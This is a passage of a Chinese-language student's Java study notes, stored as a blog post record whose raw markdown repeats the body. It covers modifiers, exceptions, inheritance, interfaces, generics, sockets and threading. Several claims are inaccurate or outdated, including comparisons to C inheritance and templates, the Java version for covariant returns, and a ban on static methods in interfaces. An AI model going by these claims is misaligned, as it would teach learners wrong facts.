类。\n\n![img](/img/12-130Q1234I6223.jpg)\n\n### 捕获异常\n\n使用 try 和 catch 关键字可以捕获异常。try/catch 代码块放在异常可能发生的地方。\n\ntry/catch代码块中的代码称为保护代码，使用 try/catch 的语法如下：\n\n```java\ntry\n{\n   // 程序代码\n}catch(ExceptionName e1)\n{\n   //Catch 块\n}\n```\n\nCatch 语句包含要捕获异常类型的声明。当保护代码块中发生一个异常时，try 后面的 catch 块就会被检查。\n\n如果发生的异常包含在 catch 块中，异常会被传递到该 catch 块，这和传递一个参数到方法是一样。\n\n### 多重捕获块\n\n一个 try 代码块后面跟随多个 catch 代码块的情况就叫多重捕获。\n\n```java\ntry{\n   // 程序代码\n}catch(异常类型1 异常的变量名1){\n  // 程序代码\n}catch(异常类型2 异常的变量名2){\n  // 程序代码\n}catch(异常类型3 异常的变量名3){\n  // 程序代码\n}\n```\n\n上面的代码段包含了 3 个 catch块。\n\n可以在 try 语句后面添加任意数量的 catch 块。\n\n如果保护代码中发生异常，异常被抛给第一个 catch 块。\n\n如果抛出异常的数据类型与 ExceptionType1 匹配，它在这里就会被捕获。\n\n如果不匹配，它会被传递给第二个 catch 块。\n\n如此，直到异常被捕获或者通过所有的 catch 块。\n\n### throws/throw 关键字：\n\n如果一个方法没有捕获到一个检查性异常，那么该方法必须使用 throws 关键字来声明。throws 关键字放在方法签名的尾部。\n\n也可以使用 throw 关键字抛出一个异常，无论它是新实例化的还是刚捕获到的。\n\n下面方法的声明抛出一个 RemoteException 异常：\n\n```java\nimport java.io.*;\npublic class className\n{\n  public void deposit(double amount) throws RemoteException\n  {\n    // Method implementation\n    throw new RemoteException();\n  }\n  //Remainder of class definition\n}\n```\n\n一个方法可以声明抛出多个异常，多个异常之间用逗号隔开。\n\n```java\nimport java.io.*;\npublic class className\n{\n   public void withdraw(double amount) throws RemoteException,\n                              InsufficientFundsException\n   {\n       // Method implementation\n   }\n   //Remainder of class definition\n}\n```\n\n### finally关键字\n\nfinally 关键字用来创建在 try 代码块后面执行的代码块。\n\n无论是否发生异常，finally 代码块中的代码总会被执行。\n\n在 finally 代码块中，可以运行清理类型等收尾善后性质的语句。\n\nfinally 代码块出现在 catch 代码块最后，语法如下：\n\n```java\ntry{\n  // 程序代码\n}catch(异常类型1 异常的变量名1){\n  // 程序代码\n}catch(异常类型2 异常的变量名2){\n  // 程序代码\n}finally{\n  // 程序代码\n}\n```\n\n**注意事项：**\n\n- catch 不能独立于 try 存在。\n- 在 try/catch 后面添加 finally 块并非强制性要求的。\n- try 代码后不能既没 catch 块也没 finally 块。\n- try, catch, finally 块之间不能添加任何代码。\n\n## JAVA继承\n\njava的继承和C语言差不多，除了java的类不能多继承，但类可以多继承接口。\n\n## 继承关键字\n\n继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承object（这个类在 **java.lang** 包中，所以不需要 **import**）祖先类。\n\n### extends关键字\n\n在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。\n\n```java\npublic class Animal { \n    private String name;   \n    private int id; \n    public Animal(String myName, String myId) { \n        name= myName;\n        id= myId;\n        //初始化属性值的具体实现\n    } \n    public void eat() {  //吃东西方法的具体实现  } \n    public void sleep() { //睡觉方法的具体实现  } \n} \n \npublic class Penguin  extends  Animal{ \n    public Penguin(String myName,String myId){\n    \tsuper(myName, myId)\t\t//直接调用父类构造方法\n    }\n}\n```\n\n\n\n### implements关键字\n\n使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。\n\n```java\npublic interface A {\n    public void eat();\n    public void sleep();\n}\n \npublic interface B {\n    public void show();\n}\n \npublic class C implements A,B {\n}\n```\n\n\n\n### super 与 this 关键字\n\n**super**关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。\n\n**super()**函数：可以用于调用直接父类构造函数。\n\n如果父类构造函数没有参数，则在子类的构造器中不需要使用 **super** 关键字调用父类构造器，系统会自动调用父类的无参构造函数。\n\n**this**关键字：指向本类的引用。\n\n**PS：**使用super调用父类函数中有this关键字时，this指向的不是本类（子类）的引用，不会改变本类的成员变量，也就是不会改变本类的状态。\n\n**实例**\n\n```java\nclass Animal {\n  void eat() {\n    System.out.println(\"animal : eat\");\n  }\n}\n \nclass Dog extends Animal {\n  void eat() {\n    System.out.println(\"dog : eat\");\n  }\n  void eatTest() {\n    this.eat();   // this 调用自己的方法\n    super.eat();  // super 调用父类方法\n  }\n}\n \npublic class Test {\n  public static void main(String[] args) {\n    Animal a = new Animal();\n    a.eat();\n    Dog d = new Dog();\n    d.eatTest();\n  }\n}\n```\n\n输出结果为：\n\n```\nanimal : eat\ndog : eat\nanimal : eat\n```\n\n### final关键字\n\nfinal 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写：\n\n- 声明类：\n\n  ```java\n  final class 类名 {//类体}\n  ```\n\n- 声明方法：\n\n  ```java\n  修饰符(public/private/default/protected) final 返回值类型 方法名(){//方法体}\n  ```\n\n**注**:实例变量也可以被定义为 final，被定义为 final 的变量不能被修改。被声明为 final 类的方法自动地声明为 final，但是实例变量并不是 final\n\n### 继承的特性\n\n- 子类拥有父类非 private 的属性、方法。\n- 子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。\n- 子类可以用自己的方式实现父类的方法。\n- Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。\n- 提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。\n\n## Java 重写(Override)与重载(Overload)\n\n### 方法的重写规则\n\n- 参数列表与被重写方法的参数列表必须完全相同。\n- 返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。\n- 访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。\n- 父类的成员方法只能被它的子类重写。\n- 声明为 final 的方法不能被重写。\n- 声明为 static 的方法不能被重写，但是能够被再次声明。\n- 子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。\n- 子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。\n- 重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。\n- 构造方法不能被重写。\n- 如果不能继承一个类，则不能重写该类的方法。\n\n### 重载(Overload)\n\n重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。\n\n每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。\n\n最常用的地方就是构造器（构造函数）的重载。\n\n**重载规则:**\n\n- 被重载的方法必须改变参数列表(参数个数或类型不一样)；\n- 被重载的方法可以改变返回类型；\n- 被重载的方法可以改变访问修饰符；\n- 被重载的方法可以声明新的或更广的检查异常；\n- 方法能够在同一个类中或者在一个子类中被重载。\n- **无法以返回值类型作为重载函数的区分标准**。（跟C语言类似）\n\n## Java 多态\n\n### 多态存在的三个必要条件\n\n- 继承\n- 重写\n- **父类引用指向子类对象**：**Parent p = new Child();** （关键点！！！）\n\n## 虚函数\n\n虚函数的存在是为了多态。\n\nJava 中其实没有虚函数的概念，它的普通函数就相当于 C++ 的虚函数，动态绑定是Java的默认行为。如果 Java 中不希望某个函数具有虚函数特性，可以加上 final 关键字变成非虚函数。\n\n### 重写\n\n当子类对象调用重写的方法时，调用的是子类的方法，而不是父类中被重写的方法。\n\n要想调用父类中被重写的方法，则必须使用关键字 **super**。\n\n（这也是为什么super()函数调用父类构造方法中有this时，不会改变子类的状态，它调用的是父类的引用，改变的是父类的状态，即使这个父类根本用不到）\n\n## 抽象方法\n\n如果你想设计这样一个类，该类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么你可以在父类中声明该方法为抽象方法。\n\nAbstract 关键字同样可以用来声明抽象方法，抽象方法只包含一个方法名，而没有方法体。\n\n抽象方法没有定义，方法名后面直接跟一个分号，而不是花括号。\n\n```java\npublic abstract class Employee\n{\n   private String name;\n   private String address;\n   private int number;\n   \n   public abstract double computePay();\n   \n   //其余代码\n}\n```\n\n声明抽象方法会造成以下两个结果：\n\n- 如果一个类包含抽象方法，那么该类必须是抽象类。\n- 任何子类必须重写父类的抽象方法，或者声明自身为抽象类。\n\n继承抽象方法的子类必须重写该方法。否则，该子类也必须声明为抽象类。最终，必须有子类实现该抽象方法，否则，从最初的父类到最终的子类都不能用来实例化对象。\n\n**就跟C语言差不多**\n\n## Java 接口\n\n接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。\n\n接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。\n\n除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。\n\n接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。\n\n### 接口与类相似点：\n\n- 一个接口可以有多个方法。\n- 接口文件保存在 .java 结尾的文件中，文件名使用接口名。\n- 接口的字节码文件保存在 .class 结尾的文件中。\n- 接口相应的字节码文件必须在与包名称相匹配的目录结构中。\n\n### 接口与类的区别：\n\n- 接口不能用于实例化对象。\n- 接口没有构造方法。\n- 接口中所有的方法必须是抽象方法。\n- 接口不能包含成员变量，除了 static 和 final 变量。\n- 接口不是被类继承了，而是要被类实现。\n- 接口支持多继承。\n\n### 接口特性\n\n- 接口和接口中每一个方法都是是隐式抽象的,接口中的方法会被隐式的指定为 **public abstract**（只能是 public abstract，其他修饰符都会报错）。\n- 接口中可以含有变量，但是接口中的变量会被隐式的指定为 **public static final** 变量（并且只能是 public，用 private 修饰会报编译错误）。\n- 接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。\n\n### 抽象类和接口的区别\n\n- 1.抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。\n- 2.抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 **public static final** 类型的。\n- 3.接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。\n- 4.一个类只能继承一个抽象类，而一个类却可以实现多个接口。\n\n### 标记接口\n\n最常用的继承接口是没有包含任何方法的接口。\n\n**标记接口是没有任何方法和属性的接口.它仅仅表明它的类属于一个特定的类型,供其他代码来测试允许做一些事情。**\n\n标记接口作用：简单形象的说就是给某个对象打个标（盖个戳），使对象拥有某个或某些特权。\n\n例如：java.awt.event 包中的 MouseListener 接口继承的 java.util.EventListener 接口定义如下：\n\n```java\npackage java.util;\npublic interface EventListener\n{}\n```\n\n没有任何方法的接口被称为标记接口。标记接口主要用于以下两种目的：\n\n- 建立一个公共的父接口：\n\n  正如EventListener接口，这是由几十个其他接口扩展的Java API，你可以使用一个标记接口来建立一组接口的父接口。例如：当一个接口继承了EventListener接口，Java虚拟机(JVM)就知道该接口将要被用于一个事件的代理方案。\n\n- 向一个类添加数据类型：\n\n  这种情况是标记接口最初的目的，实现标记接口的类不需要定义任何接口方法(因为标记接口根本就没有方法)，但是该类通过多态性变成一个接口类型。\n\n**通俗说法**：\n\n以Serializable接口为例。一个类实现了这个接口，说明它可以被序列化。因此，我们实际上通过Serializable这个接口，给该类标记了“可被序列化”的元数据，打上了“可被序列化”的标签。这也是标记/标签接口名字的由来。\n\n一个类实现Serializable接口，使得我们可以用 *instanceof* 对类进行类型查询*,*例如：\n\n​    *if(obj instanceof Serializable) {………}*\n\n## java包\n\n语法：\n\n```java\npackage ...\t//定义一个包（表明接下来定义的这个类、接口、枚举或注释在该包中）\n例：\n    package net.java.util;\t//说明这个类在net.java.util这个包里\n      \nimport package1[.package2…].(classname);\t//引入一个包或类，使接下来可以直接使用这个包中的类\n例：\n    import net.java.util.*;\t\t//引入net.java.util包中的所有类\n\timport net.java.util.Something;\t\t//引入net.java.util包中的Something类\n```\n\n### package的目录结构\n\n类放在包中会有两种主要的结果：\n\n- 包名成为类名的一部分，正如我们前面讨论的一样。\n- 包名必须与相应的字节码所在的目录结构相吻合。\n\n例如上面的 net.java.util这个包，它里面的类的java文件的路径就是：\n\n\\sources\\net\\java\\util\\ *.java\n\nclass文件的的路径就是：\n\n\\classes\\net\\java\\util\\ *.class\n\n## 泛型\n\n### 泛型方法（C语言中的模板）\n\n你可以写一个泛型方法，该方法在调用时可以接收不同类型的参数。根据传递给泛型方法的参数类型，编译器适当地处理每一个方法调用。\n\n下面是定义泛型方法的规则：\n\n- 所有泛型方法声明都有一个类型参数声明部分（由尖括号分隔），**该类型参数声明部分在方法返回类型之前**（在下面例子中的<E>）。\n- 每一个类型参数声明部分包含一个或多个类型参数，参数间用逗号隔开。一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符。\n- 类型参数能被用来声明返回值类型，并且能作为泛型方法得到的实际参数类型的占位符。\n- 泛型方法体的声明和其他方法一样。注意**类型参数只能代表引用型类型，不能是原始类型**（像int,double,char的等）。\n\n**实例：**\n\n```java\npublic class GenericMethodTest\n{\n   // 泛型方法 printArray                         \n   public static < E > void printArray( E[] inputArray )\n   {\n      // 输出数组元素            \n         for ( E element : inputArray ){        \n            System.out.printf( \"%s \", element );\n         }\n         System.out.println();\n    }\n \n    public static void main( String args[] )\n    {\n        // 创建不同类型数组： Integer, Double 和 Character\n        Integer[] intArray = { 1, 2, 3, 4, 5 };\n        Double[] doubleArray = { 1.1, 2.2, 3.3, 4.4 };\n        Character[] charArray = { 'H', 'E', 'L', 'L', 'O' };\n \n        System.out.println( \"整型数组元素为:\" );\n        printArray( intArray  ); // 传递一个整型数组\n \n        System.out.println( \"\\n双精度型数组元素为:\" );\n        printArray( doubleArray ); // 传递一个双精度型数组\n \n        System.out.println( \"\\n字符型数组元素为:\" );\n        printArray( charArray ); // 传递一个字符型数组\n    } \n}\n```\n\n## Java 网络编程\n\n### Socket 编程\n\n套接字使用TCP提供了两台计算机之间的通信机制。 客户端程序创建一个套接字，并尝试连接服务器的套接字。\n\n当连接建立时，服务器会创建一个 Socket 对象。客户端和服务器现在可以通过对 Socket 对象的写入和读取来进行通信。\n\njava.net.Socket 类代表一个套接字，并且 java.net.ServerSocket 类为服务器程序提供了一种来监听客户端，并与他们建立连接的机制。\n\n以下步骤在两台计算机之间使用套接字建立TCP连接时会出现：\n\n- **服务器实例化一个 ServerSocket 对象，表示通过服务器上的端口通信。**\n- **服务器调用 ServerSocket 类的 accept() 方法，该方法将一直等待，直到客户端连接到服务器上给定的端口。**\n- **服务器正在等待时，一个客户端实例化一个 Socket 对象，指定服务器名称和端口号来请求连接。**\n- **Socket 类的构造函数试图将客户端连接到指定的服务器和端口号。如果通信被建立，则在客户端创建一个 Socket 对象能够与服务器进行通信。**\n- **在服务器端，accept() 方法返回服务器上一个新的 socket 引用，该 socket 连接到客户端的 socket。**\n\n连接建立后，通过使用 I/O 流在进行通信，每一个socket都有一个输出流和一个输入流，客户端的输出流连接到服务器端的输入流，而客户端的输入流连接到服务器端的输出流。\n\nTCP 是一个双向的通信协议，因此数据可以通过两个数据流在同一时间发送。\n\n## Java 多线程编程\n\n### 线程的优先级\n\n每一个 Java 线程都有一个优先级，这样有助于操作系统确定线程的调度顺序。\n\nJava 线程的优先级是一个整数，其取值范围是 1 （Thread.MIN_PRIORITY ） - 10 （Thread.MAX_PRIORITY ）。\n\n默认情况下，每一个线程都会分配一个优先级 NORM_PRIORITY（5）。\n\n具有较高优先级的线程对程序更重要，并且应该在低优先级的线程之前分配处理器资源。但是，线程优先级不能保证线程执行的顺序，而且非常依赖于平台。\n\n**共有以下三种方法来创建多线程**\n\n### 通过实现 Runnable 接口来创建线程\n\n创建一个线程，最简单的方法是创建一个实现 Runnable 接口的类。\n\n为了实现 Runnable，一个类只需要执行一个方法调用 run()，声明如下：\n\n```java\npublic void run()\n```\n\n你可以重写该方法，重要的是理解的 run() 可以调用其他方法，使用其他类，并声明变量，就像主线程一样。\n\n在创建一个实现 Runnable 接口的类之后，你可以在类中实例化一个线程对象。\n\nThread 定义了几个构造方法，下面的这个是我们经常使用的：\n\n```java\nThread(Runnable threadOb,String threadName);\n```\n\n这里，threadOb 是一个实现 Runnable 接口的类的实例，并且 threadName 指定新线程的名字。\n\n新线程创建之后，调用它的 start() 方法它才会运行。\n\n```java\nvoid start();\n```\n\n### 通过继承Thread来创建线程\n\n创建一个线程的第二种方法是创建一个新的类，该类继承 Thread 类，然后创建一个该类的实例。\n\n继承类必须重写 run() 方法，该方法是新线程的入口点。它也必须调用 start() 方法才能执行。\n\n该方法尽管被列为一种多线程实现方式，但是本质上也是实现了 Runnable 接口的一个实例。\n\n### 通过 Callable 和 Future 创建线程\n\n- 1.创建 Callable 接口的实现类，并实现 call() 方法，该 call() 方法将作为线程执行体，并且有返回值。\n- 2.创建 Callable 实现类的实例，使用 FutureTask 类来包装 Callable 对象，该 FutureTask 对象封装了该 Callable 对象的 call() 方法的返回值。\n- 3.使用 FutureTask 对象作为 Thread 对象的 target 创建并启动新线程。\n- 4.调用 FutureTask 对象的 get() 方法来获得子线程执行结束后的返回值。\n\n\n\n## 创建线程的三种方式的对比\n\n- 1. 采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。\n- 2. 使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。","source":"_posts/2020-11-23-java学习笔记知识点.md","raw":"---\nlayout: post\ntitle: java学习笔记知识点\ndate: 2020-11-23\ncategories: blog\ntags: [编程，java]\ndescription: 应付Java考试\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n[TOC]\n\n\n\n#  java学习笔记知识点\n\n- 一个源文件中只能有一个 public 类\n- 一个源文件可以有多个非 public 类\n\n```java\nclass a{ class b{ }}\t\t这样是允许的\nclass a{}class b{}\t\t\t这样是不允许的\n```\n\n\n\n### 类型默认值\n\n Java 各个类型的默认值：\n\n| **数据类型**           | **默认值** |\n| :--------------------- | ---------- |\n| byte                   | 0          |\n| short                  | 0          |\n| int                    | 0          |\n| long                   | 0L         |\n| float                  | 0.0f       |\n| double                 | 0.0d       |\n| char                   | 'u0000'    |\n| String (or any object) | null       |\n| boolean                | false      |\n\nJava支持的一些转义字符序列。\n\n| 符号   | 字符含义                 |\n| :----- | :----------------------- |\n| \\n     | 换行 (0x0a)              |\n| \\r     | 回车 (0x0d)              |\n| \\f     | 换页符(0x0c)             |\n| \\b     | 退格 (0x08)              |\n| \\0     | 空字符 (0x0)             |\n| \\s     | 空格 (0x20)              |\n| \\t     | 制表符                   |\n| \\\"     | 双引号                   |\n| \\'     | 单引号                   |\n| \\\\     | 反斜杠                   |\n| \\ddd   | 八进制字符 (ddd)         |\n| \\uxxxx | 16进制Unicode字符 (xxxx) |\n\nJava语言支持的变量类型有：\n\n- 类变量：独立于方法之外的变量，用 static 修饰。\n- 实例变量：独立于方法之外的变量，不过没有 static 修饰。\n- 局部变量：类的方法中的变量。\n\n### final 修饰符\n\n**final 变量（常量）：**\n\nfinal 表示\"最后的、最终的\"含义，变量一旦赋值后，不能被重新赋值。被 final 修饰的实例变量必须显式指定初始值。\n\nfinal 修饰符通常和 static 修饰符一起使用来创建类常量。\n\n### abstract 修饰符\n\n**抽象类：**\n\n抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。\n\n一个类不能同时被 abstract 和 final 修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。\n\n抽象类可以包含抽象方法和非抽象方法。\n\n\n\n## 赋值运算符\n\n下面是Java语言支持的赋值运算符：\n\n| 操作符  | 描述                                                         | 例子                                     |\n| :------ | :----------------------------------------------------------- | :--------------------------------------- |\n| =       | 简单的赋值运算符，将右操作数的值赋给左侧操作数               | C = A + B将把A + B得到的值赋给C          |\n| + =     | 加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数     | C + = A等价于C = C + A                   |\n| - =     | 减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数     | C - = A等价于C = C - A                   |\n| * =     | 乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数     | C * = A等价于C = C * A                   |\n| / =     | 除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数     | C / = A，C 与 A 同类型时等价于 C = C / A |\n| （％）= | 取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数 | C％= A等价于C = C％A                     |\n| << =    | 左移位赋值运算符                                             | C << = 2等价于C = C << 2                 |\n| >> =    | 右移位赋值运算符                                             | C >> = 2等价于C = C >> 2                 |\n| ＆=     | 按位与赋值运算符                                             | C＆= 2等价于C = C＆2                     |\n| ^ =     | 按位异或赋值操作符                                           | C ^ = 2等价于C = C ^ 2                   |\n| \\| =    | 按位或赋值操作符                                             | C \\| = 2等价于C = C \\| 2                 |\n\n## instanceof 运算符\n\n该运算符用于操作对象实例，检查该对象是否是一个特定类型（类类型或接口类型）。\n\ninstanceof运算符使用格式如下：\n\n```\n( Object reference variable ) instanceof  (class/interface type)\n```\n\n如果运算符左侧变量所指的对象，是操作符右侧类或接口(class/interface)的一个对象，那么结果为真。\n\n下面是一个例子：\n\n```\nString name = \"James\";\nboolean result = name instanceof String; // 由于 name 是 String 类型，所以返回真\n```\n\n如果被比较的对象兼容于右侧类型,该运算符仍然返回true。\n\n看下面的例子：\n\n```java\nclass Vehicle {}\n \npublic class Car extends Vehicle {\n   public static void main(String[] args){\n      Vehicle a = new Car();\n      boolean result =  a instanceof Car;\n      System.out.println( result);\n   }\n}\n```\n\n## Java 增强 for 循环\n\nJava5 引入了一种主要用于数组的增强型 for 循环。\n\nJava 增强 for 循环语法格式如下:\n\nfor(声明语句 : 表达式) {   //代码句子 }\n\n**声明语句：**声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。\n\n**表达式：**表达式是要访问的数组名，或者是返回值为数组的方法。\n\n**实例：**\n\n```java\npublic class Test {\n   public static void main(String args[]){\n      int [] numbers = {10, 20, 30, 40, 50};\n \n      for(int x : numbers ){\n         System.out.print( x );\n         System.out.print(\",\");\n      }\n      System.out.print(\"\\n\");\n      String [] names ={\"James\", \"Larry\", \"Tom\", \"Lacy\"};\n      for( String name : names ) {\n         System.out.print( name );\n         System.out.print(\",\");\n      }\n   }\n}\n```\n\n\n\n## String类\n\njava的String类一般定义后不再改变（字符串），要频繁修改，使用StringBuffer 和 StringBuilder 类\n\njava的字符数组可以直接用new String()方式转换成字符串。\n\n## Java StringBuffer 和 StringBuilder 类\n\n\n\n当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。\n\n和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。\n\nStringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。\n\n由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。\n\n## JAVA的Main函数\n\n### public static void main(String[] args)\n\n如果要调用其他类的main函数，只要像调用它的公有方法一样就行，但要记得必须带上一个String字符串参数（new []String{}）。\n\n另，由于main函数是静态方法，所以调用时并不需要对象实例。\n\n例：\n\nTest.java\n\n```java\npublic class Test {\n    public static void main(String[] args) {\n//        int x=10;\n        int[] str={1,2,3,4,5};\n        for(int i:str)\n        {\n            System.out.println(\"这个数现在为：\"+i);\n        }\n    }\n}\n\n```\n\nTestTest.java\n\n```java\npublic class TestTest {\n    public static void main(String[] args) {\n//        Test test=new Test();\n        Test.main(new String[]{});\n    }\n}\n```\n\n运行结果：\n\n```shell\nD:\\JDK\\8\\bin\\java.exe TestTest\n这个数现在为：1\n这个数现在为：2\n这个数现在为：3\n这个数现在为：4\n这个数现在为：5\n```\n\n1. #### public\n\n   访问修饰符，public表示可访问权限最高。\n\n2. #### static\n\n   static关键字是重点。\n   static关键字用来修饰静态成员变量或者方法。\n\n   通俗的说，static表示其修饰的成员变量或方法不需要实例化类就可以使用。也就是说，static变量不依赖于类的任何实例，只要类被加载(加载不等于实例化)，jvm（java虚拟机）就可以直接找到他们而不需要创建关于类的任何对象。\n   static关键字前可以有修饰符进行修饰，当使用public static时，其实相当于创建了一个**全局变量(方法)**。\n   再来看static修饰的代码块(即为static {…}形式的)，也叫做静态代码块。概念不必多讲，静态代码块有一个非常重要的特点：\n\n   **随着类的加载而执行且只执行一次**。\n   静态代码块可以有多个，位置可以随便放，它不在任何的方法体内，jvm加载类时会优先执行这些静态的代码块，如果static代码块有多个，jvm将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。\n\n   那么main函数前加public static的意义是什么呢？意义就是这样的话，在当前类还未实例化的时候，可以运行main函数。\n\n3. #### void\n\n   与C系语言不同的是，java语言默认都是正常状态结束。也就是System.exit(0)，异常结束是1。所以，java的主方法没有必要存在返回值，即void。\n\n4. #### main\n\n   沿袭C系列main命名的主函数。\n\n5. #### String[]\n\n   使用命令行运行class文件的时候是可以附加参数的，懂得都懂，比如 Terminal>java HelloWorld test  这种写法。test会作为参数传入mian方法。因为参数并不仅限一个，所以定义成数组格式。\n\n   但在IDE中运行Java程序还是必须得在main函数中加上String[] args，否则main函数无法运行。\n\n   **用String数组得原因：**\n   String作为java中最万能的包装类具有普遍性。天地万物都可以解释成String，String也可以解析成天地万物，所以用String来存放参数自然是最优选择。\n   ps.在java 1.5以后，String[]完全可以写成String…(不定项参数)，不妨试一下。\n\n6. #### args\n\n   计算机领域用来表示参数的变量名其实就那么几个，params，args算是约定俗成的了。其实完全可以叫abc，这个想怎么叫就怎么叫。\n\n## Java 流(Stream)、文件(File)和IO\n\nJava.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。\n\nJava.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。\n\n一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。\n\n### 读取控制台输入\n\nJava 的控制台输入由 System.in 完成。\n\n为了获得一个绑定到控制台的字符流，需要把 System.in 包装在一个 BufferedReader 对象中来创建一个字符流。\n\n```java\nBufferedReader br = new BufferedReader(new \n                      InputStreamReader(System.in));\n```\n\n**BufferedReader** 对象创建后，便可以使用 **read()** 方法从控制台读取一个字符，或者用 **readLine()** 方法读取一个字符串。\n\n### 控制台输出\n\n控制台的输出由 print( ) 和 println() 完成，这些方法都由类 PrintStream 定义，System.out 是该类对象的一个引用。\n\nPrintStream 继承了 OutputStream类，并且实现了方法 write()。这样，write() 也可以用来往控制台写操作。\n\n```java\n//用 write() 把字符 \"A\" 和紧跟着的换行符输出到屏幕\nimport java.io.*;\n \n//演示 System.out.write().\npublic class WriteDemo {\n    public static void main(String args[]) {\n        int b;\t\t//用char也行\n        b = 'A';\n        System.out.write(b);\n        System.out.write('\\n');\n    }\n}\n```\n\nwrite() 方法不经常使用，因为 print() 和 println() 方法用起来更为方便。\n\n### 读写文件\n\n下图是一个描述输入流和输出流的类层次图。\n\n![img](/img/iostream2xx.png)\n\n## Java 异常处理\n\n异常是程序中的一些错误，但并不是所有的错误都是异常，并且错误有时候是可以避免的。\n\n比如说，你的代码少了一个分号，那么运行出来结果是提示是错误 java.lang.Error；如果你用System.out.println(11/0)，那么你是因为你用0做了除数，会抛出 java.lang.ArithmeticException 的异常。\n\n异常发生的原因有很多，通常包含以下几大类：\n\n- 用户输入了非法数据。\n- 要打开的文件不存在。\n- 网络通信时连接中断，或者JVM内存溢出。\n\n这些异常有的是因为用户错误引起，有的是程序错误引起的，还有其它一些是因为物理错误引起的。-\n\n要理解Java异常处理是如何工作的，你需要掌握以下三种类型的异常：\n\n- **检查性异常：**最具代表的检查性异常是用户错误或问题引起的异常，这是程序员无法预见的。例如要打开一个不存在文件时，一个异常就发生了，这些异常在编译时不能被简单地忽略。\n- **运行时异常：** 运行时异常是可能被程序员避免的异常。与检查性异常相反，运行时异常可以在编译时被忽略。\n- **错误：** 错误不是异常，而是脱离程序员控制的问题。错误在代码中通常被忽略。例如，当栈溢出时，一个错误就发生了，它们在编译也检查不到的。\n\n异常类有两个主要的子类：IOException 类和 RuntimeException 类。\n\n![img](/img/12-130Q1234I6223.jpg)\n\n### 捕获异常\n\n使用 try 和 catch 关键字可以捕获异常。try/catch 代码块放在异常可能发生的地方。\n\ntry/catch代码块中的代码称为保护代码，使用 try/catch 的语法如下：\n\n```java\ntry\n{\n   // 程序代码\n}catch(ExceptionName e1)\n{\n   //Catch 块\n}\n```\n\nCatch 语句包含要捕获异常类型的声明。当保护代码块中发生一个异常时，try 后面的 catch 块就会被检查。\n\n如果发生的异常包含在 catch 块中，异常会被传递到该 catch 块，这和传递一个参数到方法是一样。\n\n### 多重捕获块\n\n一个 try 代码块后面跟随多个 catch 代码块的情况就叫多重捕获。\n\n```java\ntry{\n   // 程序代码\n}catch(异常类型1 异常的变量名1){\n  // 程序代码\n}catch(异常类型2 异常的变量名2){\n  // 程序代码\n}catch(异常类型3 异常的变量名3){\n  // 